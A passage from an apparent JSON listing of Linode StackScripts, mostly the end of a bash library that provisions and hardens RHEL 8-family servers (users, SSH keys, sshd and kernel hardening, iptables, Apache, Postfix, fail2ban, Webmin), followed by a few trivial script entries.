      COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n# INCIDENTAL,
      SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n#
      TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
      OR\n# BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
      WHETHER IN\n# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
      ARISING IN\n# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
      POSSIBILITY OF SUCH\n# DAMAGE.\n\nsystem_update() {\n    # updates all packages
      and adds the epel repository\n    dnf -y install epel-release\n    dnf -y update\n    dnf
      config-manager --set-enabled PowerTools\n}\n\ninstall_essentials() {\n    #
      installs commonly used packages \n    dnf -y install iptables-services ipset
      dnf-utils bind-utils policycoreutils-python-utils zip tar htop wget\n}\n\nget_primary_ip()
      {\n    # returns the system''s primary IPv4 address\n    hostname -I | cut -d
      '' '' -f 1\n}\n\nget_primary_ip6() {\n    # returns the system''s primary IPv6
      address\n    hostname -I | cut -d '' '' -f 2\n}\n\nget_rdns() {\n    # returns
      the reverse dns of an IPv4 address\n    # ${1} - required - the IPv4 address
      to lookup\n    local -r ip_address=\"${1}\"\n    if [ -z \"${ip_address}\" ];
      then\n        printf \"ERROR: (get_rdns) IP address undefined\\n\"\n        return
      1;\n    fi\n    host \"${ip_address}\" | awk ''/pointer/ {print $5}'' | sed
      ''s/\\.$//''\n}\n\nget_rdns_primary_ip() {\n    # returns the reverse dns of
      the system''s primary IPv4 address\n    host \"$(hostname -I | cut -d '' ''
      -f 1)\" | awk ''/pointer/ {print $5}'' | sed ''s/\\.$//''\n}\n\nset_hostname()
      {\n    # sets the system''s hostname\n    # ${1} - required - the hostname to
      assign\n    local -r hostname=\"${1}\"\n    if [ -z \"${hostname}\" ]; then\n        printf
      \"ERROR: (set_hostname) hostname undefined\\n\"\n        return 1;\n    fi\n    hostnamectl
      set-hostname \"${hostname}\"\n}\n\nadd_host_entry() {\n    # adds an entry to
      /etc/hosts\n    # ${1} - required - the IP address to set a hosts entry for\n    #
      ${2} - required - the fully-qualified domain name to set to the IP\n    # ${3}
      - optional - the hostname to set to the IP\n    local -r ip_address=\"${1}\"\n    local
      -r fqdn=\"${2}\"\n    local -r hostname=\"${3}\"\n    local -r rdns=\"$(host
      \"$(hostname -I | cut -d '' '' -f 1)\" | awk ''/pointer/ {print $5}'' | sed
      ''s/\\.$//'')\"\n    if [ -z \"${ip_address}\" ] || [ -z \"${fqdn}\" ]; then\n        printf
      \"ERROR: (add_host_entry) IP address and/or FQDN undefined\\n\"\n        return
      1;\n    fi\n    echo \"${ip_address} ${fqdn} ${rdns} ${hostname}\" >> /etc/hosts\n}\n\nset_timezone()
      {\n    # sets the system''s timezone\n    # ${1} - optional - timezone to set
      on the system\n    local -r timezone=\"${1}\"\n    if [ -z \"${timezone}\" ];
      then\n        timedatectl set-timezone \"UTC\"\n        return 1;\n    fi\n    timedatectl
      set-timezone \"${timezone}\"\n}\n\nadd_user() {\n    # creates a new user \n    #
      ${1} - required - username\n    # ${2} - required - password\n    local -r username=\"${1}\"\n    local
      -r password=\"${2}\"\n    if [ -z \"${username}\" ] || [ -z \"${password}\"
      ]; then\n        printf \"ERROR: (add_user) username and/or password undefined\\n\"\n        return
      1;\n    fi\n    if id \"${username}\" >/dev/null 2>&1; then\n        printf
      \"ERROR: (add_user) user already exists\\n\"\n        return 1;\n    fi\n    useradd
      \"${username}\"\n    echo \"${username}:${password}\" | chpasswd\n}\n\nadd_sudo_user()
      {\n    # creates a new user with sudo privileges\n    # ${1} - required - username\n    #
      ${2} - required - password\n    local -r username=\"${1}\"\n    local -r password=\"${2}\"\n    if
      [ -z \"${username}\" ] || [ -z \"${password}\" ]; then\n        printf \"ERROR:
      (add_sudo_user) username and/or password undefined\\n\"\n        return 1;\n    fi\n    if
      id \"${username}\" >/dev/null 2>&1; then\n        printf \"ERROR: (add_sudo_user)
      user already exists\\n\"\n        return 1;\n    fi\n    useradd \"${username}\"\n    echo
      \"${username}:${password}\" | chpasswd\n    usermod -aG wheel \"${username}\"\n}\n\nremove_user()
      {\n    # removes a user  \n    # ${1} - required - username\n    local -r username=\"${1}\"\n    if
      [ -z \"${username}\" ]; then\n        printf \"ERROR: (remove_user) username
      undefined\\n\"\n        return 1;\n    fi\n    if ! id \"${username}\" >/dev/null
      2>&1; then\n        printf \"ERROR: (remove_user) user not found\\n\"\n        return
      1;\n    fi\n    killall -KILL -u \"${username}\"\n    userdel -Z -r -f \"${username}\"\n}\n\nadd_public_key()
      {\n    # adds a public key to authorized_keys for the specified user\n    #
      ${1} - required - username\n    # ${2} - required - public key\n    local -r
      username=\"${1}\"\n    local -r public_key=\"${2}\"\n    if [ -z \"${username}\"
      ] || [ -z \"${public_key}\" ]; then\n        printf \"ERROR: (add_public_key)
      username and/or public key undefined\\n\"\n        return 1;\n    fi\n    if
      ! id \"${username}\" >/dev/null 2>&1; then\n        printf \"ERROR: (add_public_key)
      user not found\\n\"\n        return 1;\n    fi\n    if [ \"${username}\" ==
      \"root\" ]; then\n        mkdir -p /root/.ssh\n        touch /root/.ssh/authorized_keys\n        echo
      \"${public_key}\" >> /root/.ssh/authorized_keys\n        return 1;\n    fi\n    mkdir
      -p /home/\"${username}\"/.ssh\n    chmod -R 700 /home/\"${username}\"/.ssh/\n    touch
      /home/\"${username}\"/.ssh/authorized_keys\n    echo \"${public_key}\" >> /home/\"${username}\"/.ssh/authorized_keys\n    chown
      -R \"${username}\":\"${username}\" /home/\"${username}\"/.ssh\n    chmod 600
      /home/\"${username}\"/.ssh/authorized_keys\n}\n\nadd_public_key_from_github()
      {\n    # adds public keys from a github account to authorized_keys for the specified
      user\n    # ${1} - required - username\n    # ${2} - required - github account\n    local
      -r username=\"${1}\"\n    local -r github_account=\"${2}\"\n    if [ -z \"${username}\"
      ] || [ -z \"${github_account}\" ]; then\n        printf \"ERROR: (add_public_key_from_github)
      username and/or github account undefined\\n\"\n        return 1;\n    fi\n    if
      ! id \"${username}\" >/dev/null 2>&1; then\n        printf \"ERROR: (add_public_key_from_github)
      user not found\\n\"\n        return 1;\n    fi\n    local -r public_key=\"$(curl
      -sSL https://github.com/\"${github_account}\".keys)\"\n    if [ \"${public_key}\"
      == \"Not Found\" ]; then\n        printf \"ERROR: (add_public_key_from_github)
      %s.keys not found\\n\" \"${github_account}\"\n        return 1;\n    fi\n    if
      [ \"${username}\" == \"root\" ]; then\n        mkdir -p /root/.ssh\n        touch
      /root/.ssh/authorized_keys\n        echo \"${public_key}\" >> /root/.ssh/authorized_keys\n        return
      1;\n    fi\n    mkdir -p /home/\"${username}\"/.ssh\n    chmod -R 700 /home/\"${username}\"/.ssh/\n    touch
      /home/\"${username}\"/.ssh/authorized_keys\n    echo \"${public_key}\" >> /home/\"${username}\"/.ssh/authorized_keys\n    chown
      -R \"${username}\":\"${username}\" /home/\"${username}\"/.ssh\n    chmod 600
      /home/\"${username}\"/.ssh/authorized_keys\n}\n\ndisable_root_login() {\n    #
      disables root SSH access\n    cp -n /etc/ssh/sshd_config /etc/ssh/sshd_config.orig\n    sed
      -i -e \"s/[# \\t]*PermitRootLogin [a-z\\-]*/PermitRootLogin no/i\" /etc/ssh/sshd_config\n    systemctl
      restart sshd\n}\n\nenable_root_login() {\n    # enables root SSH access (with
      a key only)\n    cp -n /etc/ssh/sshd_config /etc/ssh/sshd_config.orig\n    sed
      -i -e \"s/[# \\t]*PermitRootLogin [a-z\\-]*/PermitRootLogin prohibit-password/i\"
      /etc/ssh/sshd_config\n    systemctl restart sshd\n}\n\ndisable_password_authentication()
      {\n    # disables password authentication\n    cp -n /etc/ssh/sshd_config /etc/ssh/sshd_config.orig\n    sed
      -i -e \"s/[# \\t]*PasswordAuthentication [a-z]*/PasswordAuthentication no/i\"
      /etc/ssh/sshd_config\n    systemctl restart sshd\n}\n\nenable_password_authentication()
      {\n    # enables password authentication\n    cp -n /etc/ssh/sshd_config /etc/ssh/sshd_config.orig\n    sed
      -i -e \"s/[# \\t]*PasswordAuthentication [a-z]*/PasswordAuthentication yes/i\"
      /etc/ssh/sshd_config\n    systemctl restart sshd\n}\n\nget_ssh_port() {\n    #
      returns the system''s SSH port number\n    sed -n -e ''s/Port //p'' /etc/ssh/sshd_config\n}\n\nset_ssh_port()
      {\n    # reassigns the SSH port number \n    # ${1} - required - SSH port\n    local
      -r ssh_port=\"${1}\"\n    if [ -z \"${ssh_port}\" ]; then\n        printf \"ERROR:
      (set_ssh_port) SSH port undefined\\n\"\n        return 1;\n    fi\n    cp -n
      /etc/ssh/sshd_config /etc/ssh/sshd_config.orig\n    sed -i -e \"s/[# \\t]*Port
      [0-9]*/Port ${ssh_port}/i\" /etc/ssh/sshd_config\n    if [ ${ssh_port} != \"22\"
      ]; then\n        semanage port -a -t ssh_port_t -p tcp \"${ssh_port}\"\n    fi\n    systemctl
      restart sshd\n}\n\nharden_ssh() {\n    # hardens ssh by tweaking default configuration\n    #
      SEE: https://www.sshaudit.com/hardening_guides.html#rhel8\n    cp -n /etc/ssh/sshd_config
      /etc/ssh/sshd_config.orig\n    sed -i -e \"s/[# \\t]*AddressFamily [a-z]*/AddressFamily
      inet/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[# \\t]*PermitRootLogin [a-z\\-]*/PermitRootLogin
      no/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[# \\t]*StrictModes [a-z]*/StrictModes
      yes/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[# \\t]*MaxAuthTries [0-9]*/MaxAuthTries
      3/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[# \\t]*PubkeyAuthentication [a-z]*/PubkeyAuthentication
      yes/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[# \\t]*PasswordAuthentication
      [a-z]*/PasswordAuthentication no/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[#
      \\t]*HostbasedAuthentication [a-z]*/HostbasedAuthentication no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*ChallengeResponseAuthentication [a-z]*/ChallengeResponseAuthentication
      no/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[# \\t]*GSSAPIAuthentication
      [a-z]*/GSSAPIAuthentication no/i\" /etc/ssh/sshd_config\n    sed -i -e \"s/[#
      \\t]*AllowAgentForwarding [a-z]*/AllowAgentForwarding no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*AllowTcpForwarding [a-z]*/AllowTcpForwarding no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*PermitTunnel [a-z]*/PermitTunnel no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*X11Forwarding [a-z]*/X11Forwarding no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*TCPKeepAlive [a-z]*/TCPKeepAlive no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*IgnoreRhosts [a-z]*/IgnoreRhosts yes/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*PermitEmptyPasswords [a-z]*/PermitEmptyPasswords no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*UsePAM [a-z]*/UsePAM no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*UseDNS [a-z]*/UseDNS no/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*ClientAliveInterval [0-9]*/ClientAliveInterval 300/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*ClientAliveCountMax [0-9]*/ClientAliveCountMax 3/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*MaxSessions [0-9]*/MaxSessions 3/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*LoginGraceTime [0-9a-z]*/LoginGraceTime 30/i\" /etc/ssh/sshd_config\n    sed
      -i -e \"s/[# \\t]*LogLevel [a-z]*/LogLevel VERBOSE/i\" /etc/ssh/sshd_config\n    #
      disables the ECDSA host key\n    sed -i -e \"s/^HostKey \\/etc\\/ssh\\/ssh_host_ecdsa_key$/\\#HostKey
      \\/etc\\/ssh\\/ssh_host_ecdsa_key/g\" /etc/ssh/sshd_config\n    # regenerates
      the RSA and ED25519 keys\n    rm -f /etc/ssh/ssh_host_*\n    ssh-keygen -t rsa
      -b 4096 -f /etc/ssh/ssh_host_rsa_key -N \"\"\n    ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key
      -N \"\"\n    chgrp ssh_keys /etc/ssh/ssh_host_ed25519_key /etc/ssh/ssh_host_rsa_key\n    chmod
      g+r /etc/ssh/ssh_host_ed25519_key /etc/ssh/ssh_host_rsa_key\n    # removes the
      small Diffie-Hellman moduli\n    awk ''$5 >= 3071'' /etc/ssh/moduli > /etc/ssh/moduli.safe\n    mv
      -f /etc/ssh/moduli.safe /etc/ssh/moduli\n    # restricts supported key exchange,
      cipher, and MAC algorithms\n    cp -n /etc/crypto-policies/back-ends/opensshserver.config
      /etc/crypto-policies/back-ends/opensshserver.config.orig\n    echo -e \"CRYPTO_POLICY=''-oCiphers=chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
      -oMACs=hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com
      -oGSSAPIKexAlgorithms=gss-curve25519-sha256- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha256
      -oHostKeyAlgorithms=ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-512,ssh-rsa,ssh-rsa-cert-v01@openssh.com
      -oPubkeyAcceptedKeyTypes=ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-512,ssh-rsa,ssh-rsa-cert-v01@openssh.com''\"
      > /etc/crypto-policies/back-ends/opensshserver.config\n    systemctl restart
      sshd\n}\n\nharden_kernel() {\n    cp -n /etc/security/limits.conf /etc/security/limits.conf.orig\n    echo
      ''* hard core 0'' >> /etc/security/limits.conf\n    cat <<EOT > /etc/sysctl.d/sysctl.conf\nkernel.dmesg_restrict
      = 1\nkernel.kptr_restrict = 1\nkernel.panic = 30\nkernel.yama.ptrace_scope =
      1\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.all.arp_announce =
      2\nnet.ipv4.conf.all.arp_ignore = 1\nnet.ipv4.conf.all.log_martians = 1\nnet.ipv4.conf.all.proxy_arp
      = 0\nnet.ipv4.conf.default.accept_redirects = 0\nnet.ipv4.conf.default.accept_source_route
      = 0\nnet.ipv4.conf.default.log_martians = 1\nnet.ipv4.conf.default.rp_filter
      = 1\nnet.ipv4.conf.default.secure_redirects = 0\nnet.ipv4.conf.default.send_redirects
      = 0\nnet.ipv4.tcp_max_syn_backlog = 4096\nnet.ipv4.tcp_rfc1337 = 1\nnet.ipv4.tcp_syn_retries
      = 3\nnet.ipv4.tcp_synack_retries = 3\nnet.ipv6.conf.all.accept_redirects = 0\nnet.ipv6.conf.default.accept_ra_defrtr
      = 0\nnet.ipv6.conf.default.accept_ra_pinfo = 0\nnet.ipv6.conf.default.accept_ra_rtr_pref
      = 0\nnet.ipv6.conf.default.accept_redirects = 0\nnet.ipv6.conf.default.accept_source_route
      = 0\nnet.ipv6.conf.default.autoconf = 0\nnet.ipv6.conf.default.dad_transmits
      = 0\nnet.ipv6.conf.default.max_addresses = 1\nnet.ipv6.conf.default.router_solicitations
      = 0\nEOT\n    sysctl -p\n}\n\nharden_system() {\n    echo \"root\" > /etc/cron.allow\n    echo
      \"ALL : ALL\" > /etc/hosts.deny\n    cat <<EOT > /etc/hosts.allow\nALL : LOCAL\nALL
      : 192.168.\nALL : 127.0.\nsshd : ALL\nEOT\n    chmod 600 /etc/hosts.deny\n    chmod
      600 /etc/hosts.allow\n    chmod 600 /etc/cron.allow\n    rm -f /etc/cron.deny\n    chmod
      -R 700 /root\n    userdel -Z -r -f adm\n    userdel -Z -r -f ftp\n    userdel
      -Z -r -f games\n    userdel -Z -r -f lp\n    rmdir /usr/games\n    rmdir /usr/local/games\n    rmdir
      /var/adm\n    rmdir /var/ftp\n    rmdir /var/games\n    rmdir /var/gopher\n    systemctl
      stop kdump\n    systemctl disable kdump\n    systemctl mask kdump\n    systemctl
      mask ctrl-alt-del.target\n    cat <<EOT >> /etc/modprobe.d/hardening.conf\nblacklist
      usb-storage\nblacklist firewire-core\ninstall usb-storage /bin/true\ninstall
      sctp /bin/true\ninstall dccp /bin/true\ninstall cramfs /bin/true\ninstall freevxfs
      /bin/true\ninstall jffs2 /bin/true\ninstall hfs /bin/true\ninstall hfsplus /bin/true\ninstall
      squashfs /bin/true\ninstall udf /bin/true\ninstall cifs /bin/true\ninstall nfs
      /bin/true\ninstall nfsv3 /bin/true\ninstall nfsv4 /bin/true\ninstall gfs2 /bin/true\ninstall
      bnep /bin/true\ninstall bluetooth /bin/true\ninstall btusb /bin/true\ninstall
      net-pf-31 /bin/true\ninstall appletalk /bin/true\ninstall rds /bin/true\ninstall
      tipc /bin/true\nEOT\n}\n\ndisable_ip6() {\n    cat <<EOT >> /etc/sysctl.d/sysctl.conf\nnet.ipv6.conf.all.disable_ipv6
      = 1\nnet.ipv6.conf.default.disable_ipv6 = 1\nnet.ipv6.conf.lo.disable_ipv6 =
      1\nEOT\n    sysctl -p\n    echo \"options ipv6 disable=1\" >> /etc/modprobe.d/hardening.conf\n    echo
      \"NETWORKING_IPV6=no\" >> /etc/sysconfig/network\n    echo \"IPV6INIT=no\" >>
      /etc/sysconfig/network\n    ip6tables -F\n    ip6tables --policy INPUT DROP\n    ip6tables
      --policy FORWARD DROP\n    ip6tables --policy OUTPUT DROP\n    service ip6tables
      save\n    systemctl restart ip6tables\n}\n\nopen_port() {\n    # ${1} - required
      - IPv4 TCP port to open\n    local -r port=\"${1}\"\n    if [ -z \"${port}\"
      ]; then\n        printf \"ERROR: (open_port) port undefined\\n\"\n        return
      1;\n    fi\n    cp -n /etc/sysconfig/iptables /etc/sysconfig/iptables.orig\n    iptables
      -A INPUT -p tcp -m tcp --dport \"${port}\" -m conntrack --ctstate NEW -j ACCEPT\n    service
      iptables save\n    systemctl restart iptables\n}\n\nopen_ip6_port() {\n    #
      ${1} - required - IPv6 TCP port to open\n    local -r port=\"${1}\"\n    if
      [ -z \"${port}\" ]; then\n        printf \"ERROR: (open_ip6_port) port undefined\\n\"\n        return
      1;\n    fi\n    cp -n /etc/sysconfig/ip6tables /etc/sysconfig/ip6tables.orig\n    ip6tables
      -A INPUT -p tcp -m tcp --dport \"${port}\" -m conntrack --ctstate NEW -j ACCEPT\n    service
      ip6tables save\n    systemctl restart ip6tables\n}\n\nopen_udp_port() {\n    #
      ${1} - required - IPv4 UDP port to open\n    local -r port=\"${1}\"\n    if
      [ -z \"${port}\" ]; then\n        printf \"ERROR: (open_port) port undefined\\n\"\n        return
      1;\n    fi\n    cp -n /etc/sysconfig/iptables /etc/sysconfig/iptables.orig\n    iptables
      -A INPUT -p udp -m udp --dport \"${port}\" -m conntrack --ctstate NEW -j ACCEPT\n    service
      iptables save\n    systemctl restart iptables\n}\n\nopen_ip6_udp_port() {\n    #
      ${1} - required - IPv6 UDP port to open\n    local -r port=\"${1}\"\n    if
      [ -z \"${port}\" ]; then\n        printf \"ERROR: (open_ip6_port) port undefined\\n\"\n        return
      1;\n    fi\n    cp -n /etc/sysconfig/ip6tables /etc/sysconfig/ip6tables.orig\n    ip6tables
      -A INPUT -p udp -m udp --dport \"${port}\" -m conntrack --ctstate NEW -j ACCEPT\n    service
      ip6tables save\n    systemctl restart ip6tables\n}\n\nadd_port() {\n    # opens
      a port in the firewall\n    # ${1} - required - IP standard (ipv4/ipv6)\n    #
      ${2} - required - port #\n    # ${3} - required - protocol (tcp/udp)\n    local
      -r standard=\"${1}\"\n    local -r port=\"${2}\"\n    local -r protocol=\"${3}\"\n    if
      [ -z \"${standard}\" ] || [ -z \"${port}\" ] || [ -z \"${protocol}\" ]; then\n        printf
      \"ERROR: (add_port) missing argument - ipv4/ipv6, port #, tcp/udp\\n\"\n        return
      1;\n    fi\n    if [ \"${standard}\" == ''ipv4'' ]; then\n        cp -n /etc/sysconfig/iptables
      /etc/sysconfig/iptables.orig\n        iptables -A INPUT -p \"${protocol}\" -m
      \"${protocol}\" --dport \"${port}\" -m conntrack --ctstate NEW -j ACCEPT\n    elif
      [ \"${standard}\" == ''ipv6'' ]; then\n        cp -n /etc/sysconfig/ip6tables
      /etc/sysconfig/ip6tables.orig\n        ip6tables -A INPUT -p \"${protocol}\"
      -m \"${protocol}\" --dport \"${port}\" -m conntrack --ctstate NEW -j ACCEPT\n    fi\n}\n\nconfigure_basic_firewall()
      {\n    # removes firewalld and creates a simple iptables firewall\n    # accepts
      pings and SSH connections only\n    systemctl stop firewalld\n    dnf -y remove
      firewalld\n    cp -n /etc/sysconfig/iptables /etc/sysconfig/iptables.orig\n    cp
      -n /etc/sysconfig/ip6tables /etc/sysconfig/ip6tables.orig\n    iptables -F\n    iptables
      --policy INPUT DROP\n    iptables --policy FORWARD DROP\n    iptables --policy
      OUTPUT ACCEPT\n    iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED
      -j ACCEPT\n    iptables -A INPUT -i lo -j ACCEPT\n    iptables -A INPUT -p icmp
      -j ACCEPT\n    iptables -A INPUT -p tcp -m tcp --dport \"$(sed -n -e ''s/^[
      \\t]*Port //p'' /etc/ssh/sshd_config)\" -m conntrack --ctstate NEW -j ACCEPT\n    service
      iptables save\n    ip6tables -F\n    ip6tables --policy INPUT DROP\n    ip6tables
      --policy FORWARD DROP\n    ip6tables --policy OUTPUT ACCEPT\n    ip6tables -A
      INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\n    ip6tables -A
      INPUT -i lo -j ACCEPT\n    ip6tables -A INPUT -p ipv6-icmp -j ACCEPT\n    service
      ip6tables save\n    systemctl enable iptables\n    systemctl enable ip6tables\n    systemctl
      restart iptables\n    systemctl restart ip6tables\n}\n\ninstall_apache() {\n    #
      installs an apache server with a simple configuration and SSL certificate\n    #
      ${1} - optional - the fully-qualified domain name to be used for the SSL certificate\n    if
      [ -z \"${1}\" ]; then\n        local -r fqdn=\"$(host \"$(hostname -I | cut
      -d '' '' -f 1)\" | awk ''/pointer/ {print $5}'' | sed ''s/\\.$//'')\"\n    else\n        local
      -r fqdn=\"${1}\"\n    fi\n    dnf -y install httpd mod_ssl certbot python3-certbot-apache\n    cp
      -n /etc/sysconfig/iptables /etc/sysconfig/iptables.orig\n    iptables -A INPUT
      -p tcp -m tcp --dport \"80\" -m conntrack --ctstate NEW -j ACCEPT\n    iptables
      -A INPUT -p tcp -m tcp --dport \"443\" -m conntrack --ctstate NEW -j ACCEPT\n    service
      iptables save\n    systemctl restart iptables\n    cp -n /etc/sysconfig/ip6tables
      /etc/sysconfig/ip6tables.orig\n    ip6tables -A INPUT -p tcp -m tcp --dport
      \"80\" -m conntrack --ctstate NEW -j ACCEPT\n    ip6tables -A INPUT -p tcp -m
      tcp --dport \"443\" -m conntrack --ctstate NEW -j ACCEPT\n    service ip6tables
      save\n    systemctl restart ip6tables\n    cat <<EOT > /etc/httpd/conf.d/vhosts.conf\n<VirtualHost
      *:80>\n    ServerName ${fqdn}\n    <Directory />\n        Options None\n        AllowOverride
      none\n        Require all granted\n    </Directory>\n</VirtualHost>\nEOT\n    systemctl
      enable httpd\n    systemctl restart httpd\n    cp -n /etc/httpd/conf.d/ssl.conf
      /etc/httpd/conf.d/ssl.conf.orig\n    certbot --apache --noninteractive --agree-tos
      --register-unsafely-without-email -d \"${fqdn}\" -w /var/www/html/\n    local
      -r certificatefile=\"$(sed -n -e ''s/SSLCertificateFile //p'' /etc/httpd/conf.d/vhosts-le-ssl.conf)\"\n    local
      -r certificatekeyfile=\"$(sed -n -e ''s/SSLCertificateKeyFile //p'' /etc/httpd/conf.d/vhosts-le-ssl.conf)\"\n    cp
      -n /etc/httpd/conf.d/vhosts-le-ssl.conf /etc/httpd/conf.d/vhosts-le-ssl.conf.original\n    rm
      -f /etc/httpd/conf.d/vhosts-le-ssl.conf\n    if [ -n \"${certificatefile}\"
      ] && [ -n \"${certificatekeyfile}\" ]; then\n        sed -i -e \"s#SSLCertificateFile
      .*#SSLCertificateFile ${certificatefile}#i\" /etc/httpd/conf.d/ssl.conf\n        sed
      -i -e \"s#SSLCertificateKeyFile .*#SSLCertificateKeyFile ${certificatekeyfile}#i\"
      /etc/httpd/conf.d/ssl.conf\n    fi\n    systemctl restart httpd\n}\n\ninstall_postfix()
      {\n    # installs postfix and enables local mail delivery and loopback only\n    dnf
      -y install postfix\n    cp -n /etc/postfix/main.cf /etc/postfix/main.cf.orig\n    sed
      -i -e \"s/[# \\t]*inet_protocols = .*/inet_protocols = ipv4/i\" /etc/postfix/main.cf\n    sed
      -i -e \"s/[# \\t]*smtpd_banner =.*/smtpd_banner = \\$myhostname ESMTP/i\" /etc/postfix/main.cf\n    systemctl
      enable postfix\n    systemctl restart postfix\n}\n\ninstall_fail2ban() {\n    #
      installs fail2ban-server with a simple configuration\n    local -r ssh_port=\"$(sed
      -n -e ''s/^[ \\t]*Port //p'' /etc/ssh/sshd_config)\"\n    dnf -y install fail2ban-server\n    cat
      <<EOT > /etc/fail2ban/jail.local\n[DEFAULT] \nbantime = 3600\nfindtime = 300\nmaxretry
      = 5\nbanaction = iptables-multiport\nbackend = systemd\n\n[sshd]\nenabled =
      true\nport = ${ssh_port}\nEOT\n    systemctl enable fail2ban\n    systemctl
      start fail2ban\n}\n\ninstall_webmin() {\n    # installs webmin with a simple
      configuration\n    cat <<EOT > /etc/yum.repos.d/webmin.repo\n[Webmin]\nname=Webmin
      Distribution Neutral\nbaseurl=https://download.webmin.com/download/yum\nenabled=1\ngpgcheck=1\ngpgkey=https://download.webmin.com/jcameron-key.asc\nEOT\n    dnf
      -y install webmin\n    sed -i \"s/ipv6=1/ipv6=0/i\" /etc/webmin/miniserv.conf\n    if
      [ -e \"/etc/httpd/conf.d/ssl.conf\" ]; then\n        local -r certfile=\"$(sed
      -n -e ''s/^[ \\t]*SSLCertificateFile //p'' /etc/httpd/conf.d/ssl.conf)\"\n        local
      -r keyfile=\"$(sed -n -e ''s/^[ \\t]*SSLCertificateKeyFile //p'' /etc/httpd/conf.d/ssl.conf)\"\n        echo
      \"#keyfile=${keyfile}\" >> /etc/webmin/miniserv.conf\n        echo \"#certfile=${certfile}\"
      >> /etc/webmin/miniserv.conf\n    fi\n    cp -n /etc/sysconfig/iptables /etc/sysconfig/iptables.orig\n    iptables
      -A INPUT -p tcp -m tcp --dport \"10000\" -m conntrack --ctstate NEW -j ACCEPT\n    service
      iptables save\n    systemctl restart iptables\n    if (ss -tulpn) | grep ''miniserv'';
      then\n        killall -9 miniserv.pl\n    fi\n    service webmin start\n    chkconfig
      webmin on\n}\n\ndisable_selinux() {\n    # relaxes selinux but still logs errors\n    setenforce
      permissive\n    sed -i \"s/=enforcing/=permissive/i\" \"/etc/selinux/config\"\n}\n\n\n####
      STACKSCRIPT COMPATIBILITY FUNCTIONS\n\nsystem_install_basics() {\n    install_essentials\n}\n\nsystem_primary_ip()
      {\n    get_primary_ip\n}\n\nsystem_primary_ip6() {\n    get_primary_ip6\n}\n\nsystem_set_hostname()
      {\n    set_hostname \"${1}\"\n}\n\nsystem_add_host_entry() {\n    add_host_entry
      \"${1}\" \"${2}\" \"${3}\"\n}\n\nsystem_set_timezone() {\n    set_timezone \"${1}\"\n}\n\nuser_add_sudo()
      {\n    add_sudo_user \"${1}\" \"${2}\"\n}\n\nuser_add_pubkey() {\n    add_public_key
      \"${1}\" \"${2}\"\n}\n\nssh_disable_root() {\n    disable_root_login\n    disable_password_authentication\n}\n\npostfix_install_loopback_only()
      {\n    install_postfix\n}\n\nenable_fail2ban() {\n    install_fail2ban\n}\n\napache_install()
      {\n    install_apache \"${1}\"\n}\n", "user_defined_fields": []}, {"id": 1119241,
      "username": "cecillysander", "user_gravatar_id": "b18e5b184afa0a761c23041172947c74",
      "label": "ccc", "description": "ccccc", "ordinal": 0, "logo_url": "", "images":
      ["linode/ubuntu20.04"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "", "script": "#!/bin/bash\r\necho &quot;hello&quot;", "user_defined_fields":
      []}, {"id": 662025, "username": "half5064", "user_gravatar_id": "e76358653afa8908f167511e8379bd1c",
      "label": "reboot", "description": "reboot", "ordinal": 0, "logo_url": "", "images":
      ["linode/alpine3.10"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "", "script": "#!/bin/bash''\n#linode-cli linodes reboot $half5064",
      "user_defined_fields": []}, {"id": 9225, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "XCloner powered by Webuzo", "description":
      "XCloner is a professional website Backup and Restore application designed to
      allow you to create safe complete backups of any PHP/Mysql website and to be
      able to restore them anywhere. It works as a native Joomla backup component,
      as a native Wordpress backup plugin and also as standalone PHP/Mysql backup
